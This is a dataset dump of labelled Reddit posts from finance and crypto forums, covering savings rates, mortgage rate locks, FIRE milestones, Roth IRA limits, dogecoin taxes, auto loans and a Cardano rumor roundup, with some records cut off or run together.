I did a lot of research and started to look for high interest savings accounts, like Ally. Their current savings account rates are .5% since the feds keep dropping the rates. Their CD rates are .8% for five years. However, my credit union is currently offering 1.1% CDs for a five-year term. This is the highest I've seen. Their savings account APY is not that good, not even 0.1%. I thought about putting maybe 10K right in a CD with 1% interest, but that will leave me with little-to-no liquid in case of an emergency. Obviously, I would keep saving and I would need a lot more money than 19k for a house. I'm just looking at one option right now since my savings and savings APY is nothing.

Someone recommended buying stocks, but I don't want to go that route due to the uncertainty. As far as stocks are concerned, I just have a small Roth and some money in a 403b, only about 25k right now.  I had a hard time finding employment for a few years, and finally was just able to save money about two years ago.  Obviously, I'm not looking to buy a house in the next two years or so, but my parents won't be around forever.",finance

personalfinance,Mortgage rate lock expiring 15 days before closing on new build?,"Hello everyone,

I am looking to get some advice.
I signed for a new build on September 2020.

Closing date was set for April 5th, 2021.
On the first week of March, we were told that our closing date was being moved to April 30th.

We originally would’ve gotten a 2.875% rate without delays. After we learned about the closing delay, interest rates were up at 3.125%. We felt like interest rates would probably continue to go up, perhaps 3.5% , so we did a 60 day lock at 3.25%.

Now, our new closing date is May 27th, and our rate lock expires on May 9th.

This is very irritating because interest rates are now back at 3.0%. They were at 3.25% a few weeks ago. 

Lender is telling us we would have to buy a float down plus extension fees if we want the lower rate.

I am so irritated because we didn’t think they would delay our closing date again! Now we are paying the consequences. Yes, 3.25% is still a great rate, but knowing I could get a 3% right now irritates me. This is on a 400k loan. 

This is the builders preferred lender. I’ve asked the builder why they delayed our closing date, and all I was told is that there was a shortage of materials and workers. The house already had frame work, dry wall, roofing, stucco, cabinets, etc. So I’m not sure what materials they’re trying to excuse themselves for.

Anyways, I do not want to spend money on buying down a rate or extending it. We are using the builders preferred lender, and they are covering closing costs.

Is there something I should be negotiating with the lender and builder? Or should I go with a different lender and pay closing costs? I feel like since houses are a lot more expensive than they were in September, the builder will not care and rather let me go as a customer, so they could sell the house for a lot more.

Thanks!",finance
economy,Is a economic crash coming to USA and maybe the rest of the world?,"I’m no economic expert but it just seems weird that the covid crash was so short lived.

financialindependence,My lessons toward FIRE: Hit $2.3M net worth at 52,"I learned about FIRE in later 2018 (when I was 50). I was usually maxing out my 401k, but I was not very intentional about my goals. I’m 52M married to a 53F with two adult kids (one finished graduate school the other will graduate college in 2022 with no debt). My FIRE number is about 3.5M which I hope to hit by 2027 or sooner. I’m interested in FI (financial independence) but not the RE (Retire Early) part as much. I might be “retire earlier” at 59 instead of 67. My wife currently doesn’t work outside the home (she retired early, later we had kids, and she went full-time mom).

**Background**:

High income in MCOL area. First in my family to graduate college. My initial career was focused on public service, working for a local government agency. I didn’t like this work, and after college, I transitioned into technology as a programmer still in my early 20s. I worked crazy hours at startups and Fortune 500 companies for many years. A few years ago, I pivoted to a new industry but remained in technology. The new company is lower stress and more sustainable. Recently I took an internal transfer out of technology into a business role after earning another advanced degree.

No debts except mortgage (340K) and about 300K in equity. On pace to pay off the mortgage in 11 years with a 2.375% rate. I could pay it off even faster, but that interest rate is so low…

**Breakdown of investments**:

\- IRA = 920K   
\- Spouse IRA = 200K  
\- 401k traditional = 445K   
\- 401K Roth = 12K   
\- 457b = 80K 

\-  Brokerage = 260K  
\-  Cash = 90K

Things I’ve learned on my FIRE journey - and things that have made me appreciate the FIRE community:

1. I’m not as interested in retiring early because my family doesn’t have a strong generic track record of longevity. I need to have fun along the way, and no one is promised tomorrow. I do save money, but I also spend money on things that have meaning to me including a lot of travel. (well at least before the pandemic). I like having a top-tier health insurance plan from work.

2. FIRE taught me about travel hacking. I was able to get a companion pass on Southwest for my wife, and now we travel together even on business trips. This has been life-changing, and we go visit our kids.

3. FIRE inspired me to explore a side hustle. Not so much for the extra money, but more for pursuing a part-time role that I might transition into instead of an abrupt retirement.  I now teach two college classes online. I’ve met new people, and I’m helping others. It has done a lot to reinvigorate my mental health after a year+ pandemic and working from home. It’s also helped me avoid tech job burnout that seems to be common by giving me other interesting problems to consider while helping others. I save 100% of this extra income compared to about 25% of my regular income.

4. FIRE helped me to understand other options beyond just 401k retirement savings. That’s all I used to do. When I became eligible to also participate in a 457b, I ramped that and I started making catch-up contributions the year I turned 50. In 2020, I maxed out on the 457b. I’m now also making contributions to a Roth 401K with a generous match.

5. FIRE taught me to save outside of retirement accounts too. I now have an emergency fund and a sizable brokerage account focused on index funds. This has given me TREMENDOUS freedom that I hadn’t imagined before. I now think of it as my Financial Independence money (I find the term F U money to be a bit vulgar for my tastes). If something happened, or if I couldn’t cope with the stress of my employment, I could make a change, and everything would be OK. A few years ago, that would have been stressful. I would always adapt to whatever insane deadline my employer would demand. I’ve intentionally moved to a better company, and less demanding role – and I’m happier! I have improved work/life balance and sufficient vacation to have fun with my family.

6. FIRE helped me to understand that I don’t have to wait until I’ve 59 to access retirement accounts! The rule of 55 was a revelation to me that will give me new options in just a couple of years.

7. FIRE taught me to use the Personal Capital app to calculate my FIRE number and monitor expenses. All of my investments are basically low-cost index mutual funds from Vanguard or Fidelity - except my wife’s IRA.  She’s paying high fees for an investment advisor on her 200K. I’ve encouraged her to consider my strategies, and we will continue to revisit. 

8. I mostly buy used cars or occasionally a new one and drive it into the ground. I bought my kids late-model used cars as gifts, and I drive a used 2017, and my wife drives a used 2015. All paid for at this point. I will admit that as I have gotten older and I’ve managed to achieve financial goals – I’m tempted to buy a new 2022 Corvette when my youngest kid finishes college next spring.

9. My kids have read “Simple Path to Wealth” at my request, and they are applying these principles now. I wish I had learned them in my 20s! My older kid already has an emergency fund and brokerage account. FIRE has taught me how to better prepare and teach my kids.

10. I could work to lower my expenses and retire earlier; I’m just choosing not to pursue this right now. I have made some changes inspired by this forum, like switching to T-Mobile, keeping my iPhone for 4 years, and extending the life of my laptop to 5 years. Before FIRE, I would splurge on tech frequently. I still buy incredibly cool tech; I just now have a disciplined schedule of tech refresh that is not frequent.

Anyway, I attribute a lot of my success to what I’ve learned here over the past 3 years! I don’t post much, but I learn a lot here so I thought I’d share what I’ve learned so far.",finance

CryptoCurrency,So You Want To Be A Professional Shitposter - Part One: North America,"**The Problem:** So you fancy yourself as a Chris McCandless type, a Kerouac, a rebel without a cause. But Spotify and avocado toast don't come cheap! So you go to college, work admin at the land registry, drive an Altima, have a good shirt you wear to parties and die not knowing that you could have been a professional shitposter!

**The Goal:** To find the best place to live on each continent with earnings exclusively from shitposting on [r/CryptoCurrency](https://www.reddit.com/r/CryptoCurrency/).

**The Budget:** At a Karma/Moon ratio of 0.88 and a moon price of $0.073 (time of writing) you will need to receive 15,000 karma per month to earn a wage of $963.60.

[I decided on 15,000 as this is the current proposed limit on monthly karma. Also, anything over this and you should probably just consider getting a real job and some sunlight.](https://preview.redd.it/mqipx98wgzt61.png?width=446&amp;format=png&amp;auto=webp&amp;s=a8dc536e51552dfe2759de57aaecf25530b0ad51)

**The Criteria:** After hours of extensive research, I came to the discovery that there was more than one country on the continent of North America. Yes Canada, that's right, apparently you aren't alone! It turns out that there are 23 independent countries in North (and Central) America which are home to nearly 579 million people. Using average monthly salary data, I narrowed down the list to a smaller set of countries. Once I had this list, I used Numbeo to determine a rough cost of living in each country and plugged these numbers into the patented Sweaty-Rope cost of living model to give each country a score. The main criteria are:

Accommodation: We will use the price of a one bedroom apartment outside of the city.

Utilities: This includes essentials such as Electricity, Internet, Heating, Cooling, Pornhub Premium, Water, Garbage etc.

McDonalds Meal: We will be eating 2 McMeals a day \* 30 (month).

Likelihood of Dying: We will use a combination of the Peace Index, the murder rate for the country and instances of extreme weather. I will rate this from 1-5 (5 being most likely to die) and for every notch above 1, I will add $100 to the cost of living. Think of this as hazard pay, for stuff like insurance and machetes. The consumption of 2 McDeals a day everyday will not be factored into the Likelihood of Dying.

*Note: For many of these countries the average wage is much (much) lower than the cost of living. While I could have just used the average wage, I didn't feel it would be a fair reflection of the cost of living for a foreigner moving to the country.*

**The Options:**

*The Impossible: The United States*

Given the US dominance on Reddit, and because it will act as a good benchmark for the other countries, I will look at the United States. The United States of America, often referred to as America, is a federation of 50 states and the District of Columbia, located in North America. The national animal is the bald eagle, they call biscuits ""cookies"", scones ""biscuits"" and famous people include Wesley Snipes. As the US is a large place, with varying costs of living, I decided to take the scientific approach and ask my friend to name a city in the United States that wasn't New York City. He said California, and after confirming that California is not in fact a city, we settled on Boston. Below are the results.

[It's not surprising that the average wage for a Bostonian is $5200, when you consider the high cost of accommodation, utilities and food. Despite what the media would have you believe, the likelihood of death in the US is low \(maybe add an extra couple $100 if you are a Yankees fan\), however I did add a $100 for the high cost of health insurance. Now for the bad news. With a shitposting salary of $969.78 per month, you would need multiple shitposting accounts to survive in Boston. And yes, I'm sure some of you will say \\""But in Yarnsdaleberg, West Dakota you can get an apartment for blah blah blah!\\"" but we didn't do the analysis in Yarnsdaleberg, we did it in Boston, so deal with it. Verdict: 0\/10.](https://preview.redd.it/gk4qoti0hzt61.png?width=715&amp;format=png&amp;auto=webp&amp;s=8a3864848020e6f6728ed55349194d16042db45a)

*The ""Cheapest"": Nicaragua*

Nicaragua, is a country in Central America that borders Honduras to the north, Costa Rica to the south, the Pacific Ocean to the west and the Caribbean Sea to the east. Nicaragua's most famous person is Bianca Pérez-Mora Macías (formerly Bianca Jagger) the ex wife of the Rolling Stone vocalist, its largest lake, Lake Nicaragua is the only lake in the world to contain fresh-water sharks and its national sport is baseball!

[At just $252 per month, Nicaragua earns the title of North \(Central\) Americas lowest average wage, as well the regions lowest \(non death adjusted\) cost of living \($669.78 per month\). Accounting for the high crime rate, 19 active volcanoes and high level of corruption, Nicaragua arrives at a adjusted cost of living of $974.21. This means if you cut out one McMeal \($6\) a month you will be able to fulfil your dream of shitposting for a living in Nicaragua! Verdict: 8\/10.](https://preview.redd.it/0gpxrgo8hzt61.png?width=715&amp;format=png&amp;auto=webp&amp;s=1056d8e35a1fe8da994542d49e791ed4dcc3b190)

*The ""Sweaty-Rope Choice"": Mexico*

Before you start bitching at me, yes I know, I know, Mexico's salary isn't that low - in fact the average monthly salary is $1076. But that is largely skewed by big cities like Mexico City where wages are much higher. For that reason I decided to look at Oaxaca. Oaxaca is a region to the south west of the country and is home to 265 thousand Oaxacians (or something like that). In 1897 the mayor of Oaxaca declared the radish-carving tradition an official local festival. Today the competition for the best carvings is fierce, with some weighing as much as 7 pounds (3 kilograms), and depicting anything from animals to nativity scenes.

[Just under $300 per month will cover your housing and bills, add another $300 for McDonalds \(tacos will be cheaper and far better, but lets be consistent\) and your \(non death adjusted\) cost of living comes in at $595.55. But wait, isn't kidnapping a national past time in Mexico? While, crime is indeed high in Mexico, Oaxaca is one of Mexico's safest regions and if you do get kidnapped at least you will save on rent and utilities! As a result, we will add $200 hazard cost, to bring the adjusted cost of living to $795.55. That's right not only can you support yourself through shitposting in Mexico, you can actually save $174 a month! Verdict 10\/10](https://preview.redd.it/eifmf7e5hzt61.png?width=783&amp;format=png&amp;auto=webp&amp;s=32e95f660e175f8f0e80a7eb98d61df7022d2087)

**The Conclusion:** With a shitposting salary of $969.78 per month, it is possible to live in a number of North / American countries. You will spend most of your time eating McDonalds, in an apartment twenty miles outside of the city; but still it is possible. I didn't fact check any of this, so if you do decide to move to Oaxaca based on this post, I suggest that you don't fact check it either, because what I have said is likely riddled with inaccuracies and its not very Kerouac to fact check.

The PUA 1099g tax form I downloaded from the Pennsylvanias PUA website doesn't have box numbers. Just information like your SSN, total payment, tax withheld, the tax year, and some other info like payer, etc.

personalfinance,"Did not realize there was an income limit for Roth IRA contributions, could use some advice.","Hi everyone. I'm very new to personal finance and am fumbling around a bit, my finances have been something that I was too scared to look at so I'm fairly ignorant/naive about stuff and am finding it a bit overwhelming - I'd love some advice from this subreddit on rectifying this particular situation and gaining a better understanding on Roth IRAs (I apologize if any of my terminology is wrong or clumsily presented)


Through a friend's advice I recently opened up a roth IRA account with Vanguard, and as the title states I did not realize I had to be under a certain income to contribute to it. Earlier this year I maxed out my contributions to it for 2020, and in case it's relevant: currently ~$5k of it is in Vanguard Federal money market fund, and ~$1k is in retirement fund (I was planning on slowly transferring the 5k to the retirement fund). Since this is fairly new I've only accumulated like maybe $50 in earnings.


I have not made any contributions for 2021. After finding out about the limit, I see that there is a backdoor method to contribute to the Roth IRA. I am assuming that I can proceed with this method going forward?


Though I am a bit confused what I should do with the 2020 contributions. I had my tax return done recently with an accountant, do I assume that the penalty for contributing whilst over the limit has already been paid for during my return? Should I proceed to transfer the Money Market Fund into the retirement fund, or do I now need to ""correct the excess contribution"" by withdrawing the money? (And is there a penalty for withdrawing?)

dogecoin,USA TAX INFO AS AN FYI,"I’ve noticed some posts mentioning USA tax laws and I want to make sure all of us have the RIGHT information.

First and foremost, if you’re a true HODL’r and do not need to sell or will not be selling no matter what, you have nothing to worry about.

HOW TAXES WORK IF YOU SELL.

The gains you receive from a sale must be reported to the IRS next tax season.  Robinhood will send you a 1099 form that has all the details, and you can just hand that to your tax preparer along with your other tax documents and they will know what to do with it.

HOW TAX IS DETERMINED

This is simple, there are 2 buckets you fall into when you sell.  Short Term Capital Gains or Long Term Capital Gains.

SHORT TERM CAPITAL GAINS
If you sold any portion of your assets within a YEAR of purchasing them, the gains are considered SHORT TERM CAPITAL GAINS.  

Short term capital gains are taxed at the same rate as your income.  Remember, this applies both to Federal and State unless you’re a lucky SOB and live in Texas, Nevada and a couple other states that do not have State Income Tax.

Example:  Johnny purchases 1200 doge on January 1st, 2021.  At first surge in February he’s paperhands, and sells on February 20th, 2021.  Whatever he makes from the sale will be taxed at the same percentage as his income, Federal and State.

LONG TERM CAPITAL GAINS
If you sell any investment assets that you purchased 1 or more years ago, your proceeds are considered LONG TERM CAPITAL GAINS.

If your income is 40k a year or less, the Long Term Capital Gains Tax rate is 0%.

Above 40k and it breaks down into brackets, 15% or 20%.  Typically, most people fall into the 15% vracket.

Example:  Betty purchases 1300 Dogecoins on January 1st, 2018.  Betty has diamond hands but wants to help her parents out so she sells 800 Dogecoin on April 15th, 2021.  The proceeds Betty makes will be taxed as LONG TERM CAPITAL GAINS.

This is why it’s important to HODL!

DISCLAIMER:  This is not tax advice, I am not a licenses tax specialist, just a HODL’r who uses Google, extensively.  It is strongly recommended to always consult with a licensed Tax professional for advice.

personalfinance,Auto loan refinancing help/advice,"Hi everyone,

I’m looking for some advice on my current auto loan. I took a 73 month loan in October 2019 at a moment where my credit and finances were at an all time low. My lease was up and I somehow got a loan. My credit score at that time was around  520 and monthly income without overtime $3360. The amount financed was $20840 with an APR 14.99%. Since then, i buckled down working over time, an extra job, pay raise, and cut out all unnecessary expenses.  I have paid 100% of payments on time, paid off all my debt and my credit score today is 700. My monthly income is now $5000.

I am getting mixed information on the benefit of refinancing. I have made hardly any progress on the loan with a high interest rate and monthly payment of $445. I am able to put $1000 monthly to the loan and I’ve started working more normal hours and I am able to put money away for savings. 

I’m hoping to get advice on if it’s worth refinancing or continuing to just keep my head down and pay off as much as I can. 

Thank you.",finance
personalfinance,Question About Credit,"So, to give this a little context, my fiancee was involved in a head-on collision that resulted in her Mazda 2 to be declared a total loss by our insurance. Thankfully, she was not injured, but frustratingly enough, we'd just paid off the car. We expected to have it for a few more years before we needed to shop for another, yet here we are more or less back to square one, looking at purchasing a new car for her. 

The details: Our insurance valued the car higher than what we originally paid for it (small miracles), so minus the deductible, we are getting back $4900. Insurance is also willing to reimburse the sales tax on the purchase of a new car. The bank we financed the Mazda with has approved her for a $6000 loan towards a new vehicle (which gives us some bargaining power with dealerships, or can be used for a private sale). Her credit is in the 600s, but unfortunately mine is recovering from the 300s, so I'm useless to her in this matter. That said, I earn 5-10k/yr more than her, so I can afford to shoulder some of the household expenses so she can afford something more expensive if needed, and even can provide a couple thousand from my savings to use. She has two credit cards with about $6500 owed, which is about 90% of her available credit.

The options: We are determined to find a way to end up ahead of where we were before the accident. We can see three scenarios, A) Use the insurance payout and the small loan in a private sale, and then use whatever remains of the insurance payout to pay down some of the cards. B) Use the small loan as leverage at a dealership to encourage them to get us a better financing deal, use some of the payout for money down, and then whatever remains to pay down some of the credit cards. Or C) Use some of the insurance payout to pay down the cards now, and then with more available credit, see if we can negotiate a larger and better financing deal.

The question: The scenario we are most interested in from above is 'C'. If we can negotiate a better financing deal, we can potentially purchase a newer car with fewer miles at a lower interest rate. The problem is, we have questions about how paying down some of the cards would affect her credit. We have heard that paying down large chunks of owed money can actually negatively affect credit, but that sounds counter-intuitive because wouldn't less debt and more available credit improve her score? Also, the bank is saying that they don't want to approve her for a larger amount because they want to keep her monthly payment low, and we can't determine if this is 100% due to her credit score, or because of her current income level, or because of the monthly expenses of the two cards? We obviously want to make sure that paying down the cards will have the intended effect before we go with option 'C'.

Any advice would be appreciated!",finance

personalfinance,Selling house after buying new house. How to lower monthly payments without recasting,"We are closing on a new home before we sell our current home. We have some money saved for our down payment, but our loan is big enough that the mortgage payments will be bigger than I would like. I was originally planning on putting the equity from our current house into our new loan and then recasting. Unfortunately you can't recast a VA loan. So the way I see it, we have 3 main paths forward:

1) Just go forward as is. Put the equity towards our new house after the sale of our current property. This won't change our monthly payments, but we will pay down the house faster. We can refinance our loan if the payments get too uncomfortable. But rates are going up, so the refi would probably be at a higher rate.

2) Move forward as is. Invest the equity from the sale of our house into a diversified set of fairly accessible assets. I like to keep a year's worth of expenses in our emergency fund, so I should have decent flexibility if the need to pull money from these investments did arise. It should be pretty easy to get a return higher than our loan interest rate (2.375%), but there is more risk and hassle involved in this option.

3) Take out a short term loan. If we could borrow $60k (much less than our equity), that would be enough to get our mortgage payments down to a comfortable monthly amount. We are accepting an offer on our house tomorrow, but obviously the equity from our house won't be available for a few weeks. Once we get the money from our house, we would immediately pay off the loan. I could do a 401k loan or some other type of loan.

All three of these options seem fairly reasonable to me. Am I missing something? If I did do a short term loan, what would be the best way to get $60k for a month or two?",finance

Forex,U.S. Dollar Set To Skyrocket?,"U.K. economic growth fell short of expectations in February, with 0.4% growth for the month despite the country’s third lockdown. The figure indicates that the economy is now 7.8% below the previous pace of growth before the pandemic. Sentiment remains pessimistic in Germany according to the ZEW Economic sentiment report which saw the index decline to 70.1 points in April. With the prospect of Europe’s largest economy going back into another stricter lockdown and a failed Eurozone vaccination programme, sentiment is likely to diverge between the UK and Europe. 

U.S. inflation surprised to the upside, with annualized inflation climbing to 2.6% with a month-on-month rise of 0.6%. The rise has been attributed to the gradual opening of the economy in which demand has been fueled by the recent stimulus cheques. The current pace of price increases could see the Fed implementing tighter monetary policy sooner than expected. Improving employment conditions and government support saw retail sales skyrocket during March to 9.8%. The result indicates that momentum is gathering in the US economy and points to strong economic growth going into the second quarter. 

China’s recovery looks set to continue with another month of surging exports, climbing over 30% when compared with the previous year.

personalfinance,W-4 lock-in letter - employer not complying,"Long story short. GF mistakenly claimed exempt on the W4 for new employer in 2020. IRS caught it in November 2020 and put her into the W-4 compliance program and obviously we had to pay all the forgotten tax when we did our taxes in April of this year.

The IRS letter said that the company must BEGIN withholding and 0'ed out all the W4 options. It also said to not accept any new W-4 from GF UNLESS it results in more withholding.

We've been fighting the company payroll since December trying to get them to start withholding federal income tax, and they're not. We asked them to start withholding, we asked them to start withholding and also withhold extra. They did neither, and referred to the IRS letter.

On April 15 we made an estimated tax payment in order to not get any penalties for 2021.

What do we do? We talked to the IRS and they said the employer is in error, and that we should make an estimated tax payment.

This isn't a mom-and-pop shop, it's a major pharmaceutical company and you'd think they'd be able to read the a letter from the IRS.

EDIT: Did find a FAQ on the IRS website saying that if the employer fails to honer the letter THEY are liable for paying the income tax... I wonder how that'd look on a 1040 tax filing - any ideas on that?

personalfinance,Student loan capitalization,"I have a question about federal student loans vs 401k.

Because student loans do not capitalize as long as you make your monthly payments, there is no “compounding” going on with my student loan balance.

The 401k does compound, so even if my interest rate was equal to my 401k returns, I would make significantly more money in the 401k than I would save by paying more towards student loans.

I haven’t seen any analysis of this and I am wondering if I am missing something. Of course, being debt free is valuable psychologically, but I want to know if this makes sense mathematically. I’ll worry about the psychological effects separately.

Does it make sense mathematically to pay any extra money towards the 401k instead of the student loans? I am still going to make my monthly loan payments, I just have a little extra to put towards one or the other.",finance
CryptoCurrency,Any word on what happened to Cryptopia?,"I'm still sad about the loss of my 2 million shitcoins. They could be worth literally dozens of dollars in this raging bull market.

Just curious if there was any movement from that whole situation. I used to get updates from the New Zealand feds, or whoever took it over. But I haven't heard anything in a while. Has anyone?",cryptocurrency

CryptoCurrency,Will crypto be the hedge against market crashes/inflation that it is anticipated to be?,"How do you see the future and function of crypto in a hypothetical repeat of 2008? With the fed printing money and talks of future recurring US stimulus, COVID on the rise again reducing productivity while markets achieve ATHs every day, property prices peaking globally, record low borrowing rates, what are your plans for precaution and how does crypto function in them? 

It seems that despite now increasingly widespread crypto adoption, there is still an element of fiat involved, and crypto is still used as a substitute for products valued in fiat. How would there be widespread adoption of crypto-based value determination of products in a scenario where both fiat and crypto are expected to fluctuate daily, or in the other scenario, where crypto investors are hesitant to liquidate their crypto holdings but at the same time want to capitalize on its increased utility?

This is not asking for technical solutions to the problem, but rather, personal solutions and strategies.",cryptocurrency
personalfinance,Car loan advice?,"Hello everyone, yet another car loan thread.   


My car was stolen a few months ago. I've saved some money and I was going to buy a car with some savings I had (10k). I talked to my finance person and he mentioned that I shouldn't buy outright with cash because interest rates are so low right now, I should apply for a car loan, and try not to pay a down payment if possible. 

That begs the question; how much should I attempt to borrow and how long should the loan be?

I am a graduate student making 2500 a month and spend 1250-1500 of it.

cardano,Cardano Rumor Rundown APR 19 2021: WTF is Mithral???,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list. 

Check out the youtube companion to today’s post: [https://youtu.be/pWv1bnO8dgU](https://youtu.be/pWv1bnO8dgU)

Let's go....

Newly covered today: 

1. Cardano Tattoos continue. We even have Ouroboros Omega tattoos now!  [https://twitter.com/Coinfera1/status/1383560914](https://twitter.com/Coinfera1/status/1383560914914316290)
2. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of  PoW crypto and its decentralization loving enthusiasts for years. [https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china](https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china)
3. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”.  The Ourobors Omega, Ouroboros Hydra,  &amp; Mithral parts we’ve covered before.  Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs.  Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”.  See today’s video at the link above for more discussion on this.  [https://twitter.com/IOHK\_Charles/status/1383792375860924424](https://twitter.com/IOHK_Charles/status/1383792375860924424)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

18. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience.

19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

25. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
